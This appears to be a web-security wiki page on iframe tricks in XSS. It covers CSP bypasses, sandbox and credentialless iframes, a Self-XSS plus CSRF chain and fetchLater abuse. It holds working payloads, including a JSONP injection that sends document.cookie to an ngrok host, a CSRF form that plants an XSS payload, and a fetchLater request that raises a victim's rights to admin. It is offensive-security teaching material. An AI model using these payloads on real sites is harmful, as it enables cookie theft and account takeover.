## Iframes in XSS

There are 3 ways to indicate the content of an iframed page:

- Via `src` indicating an URL (the URL may be cross origin or same origin)
- Via `src` indicating the content using the `data:` protocol
- Via `srcdoc` indicating the content

**Accesing Parent & Child vars**

```html
<html>
  <script>
    var secret = "31337s3cr37t"
  </script>

  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if2" src="child.html"></iframe>
  <iframe
    id="if3"
    srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe
    id="if4"
    src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
    function access_children_vars() {
      alert(if1.secret)
      alert(if2.secret)
      alert(if3.secret)
      alert(if4.secret)
    }
    setTimeout(access_children_vars, 3000)
  </script>
</html>
```

```html
<!-- content of child.html -->
<script>
  var secret = "child secret"
  alert(parent.secret)
</script>
```

If you access the previous html via a http server (like `python3 -m http.server`) you will notice that all the scripts will be executed (as there is no CSP preventing it)., **the parent won’t be able to access the `secret` var inside any iframe** and **only the iframes if2 & if3 (which are considered to be same-site) can access the secret** in the original window.\
Note how if4 is considered to have `null` origin.

### Iframes with CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

> [!TIP]
> Please, note how in the following bypasses the response to the iframed page doesn't contain any CSP header that prevents JS execution.

The `self` value of `script-src` won’t allow the execution of the JS code using the `data:` protocol or the `srcdoc` attribute.\
However, even the `none` value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the `src` attribute.\
Therefore it’s possible to bypass the CSP of a page with:

```html
<html>
  <head>
    <meta
      http-equiv="Content-Security-Policy"
      content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='" />
  </head>
  <script>
    var secret = "31337s3cr37t"
  </script>
  <iframe id="if1" src="child.html"></iframe>
  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe
    id="if3"
    srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe
    id="if4"
    src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```

Note how the **previous CSP only permits the execution of the inline script**.\
However, **only `if1` and `if2` scripts are going to be executed but only `if1` will be able to access the parent secret**.

Therefore, it’s possible to **bypass a CSP if you can upload a JS file to the server and load it via iframe even with `script-src 'none'`**. This can **potentially be also done abusing a same-site JSONP endpoint**.

You can test this with the following scenario were a cookie is stolen even with `script-src 'none'`. Just run the application and access it with your browser:

```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

### Other Payloads found on the wild <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>

```html
<!-- This one requires the data: scheme to be allowed -->
<iframe
  srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='
<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe
  src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

### Iframe sandbox

The content within an iframe can be subjected to additional restrictions through the use of the `sandbox` attribute. By default, this attribute is not applied, meaning no restrictions are in place.

When utilized, the `sandbox` attribute imposes several limitations:

- The content is treated as if it originates from a unique source.
- Any attempt to submit forms is blocked.
- Execution of scripts is prohibited.
- Access to certain APIs is disabled.
- It prevents links from interacting with other browsing contexts.
- Use of plugins via `<embed>`, `<object>`, `<applet>`, or similar tags is disallowed.
- Navigation of the content's top-level browsing context by the content itself is prevented.
- Features that are triggered automatically, like video playback or auto-focusing of form controls, are blocked.

The attribute's value can be left empty (`sandbox=""`) to apply all the aforementioned restrictions. Alternatively, it can be set to a space-separated list of specific values that exempt the iframe from certain restrictions.

```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```

### Credentialless iframes

As explained in [this article](https://blog.slonser.info/posts/make-self-xss-great-again/), the `credentialless` flag in an iframe is used to load a page inside an iframe without sending credentials in the request while maintaining the same origin policy (SOP) of the loaded page in the iframe.

This allows the iframe to access sensitive information from another iframe in the same SOP loaded in the parent page:

```javascript
window.top[1].document.body.innerHTML = 'Hi from credentialless';
alert(window.top[1].document.cookie);
```

- Exploit example: Self-XSS + CSRF

In this attack, the attacker prepares a malicious webpage with 2 iframes:

- An iframe that loads the victim's page with the `credentialless` flag with a CSRF that triggers a XSS (Imagin a Self-XSS in the username of the user):
  ```html
  <html>
  <body>
    <form action="http://victim.domain/login" method="POST">
      <input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
      <input type="hidden" name="password" value="Super_s@fe_password" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
  </html>
  ```

- Another iframe that actually has the user logged in (without the `credentialless` flag).

Then, from the XSS it's possible to access the other iframe as they have the same SOP and steal the cookie for example executing:

```javascript
alert(window.top[1].document.cookie);
```

### fetchLater Attack

As indicated in [this article](https://blog.slonser.info/posts/make-self-xss-great-again/) The API `fetchLater` allows to configure a request to be executed later (after a certain time). Therefore, this can be abused to for example, login a victim inside an attackers session (with Self-XSS), set a `fetchLater` request (to change the password of the current user for example) and logout from the attackers session. Then, the victim logs in in his own session and the `fetchLater` request will be executed, changing the password of the victim to the one set by the attacker.

This way even if the victim URL cannot be loaded in an iframe (due to CSP or other restrictions), the attacker can still execute a request in the victim's session.


```javascript
var req = new Request("/change_rights",{method:"POST",body:JSON.stringify({username:"victim", rights: "admin"}),credentials:"include"})
const minute = 60000
let arr = [minute, minute * 60, minute * 60 * 24, ...]
for (let timeout of arr)
  fetchLater(req,{activateAfter: timeout})
```
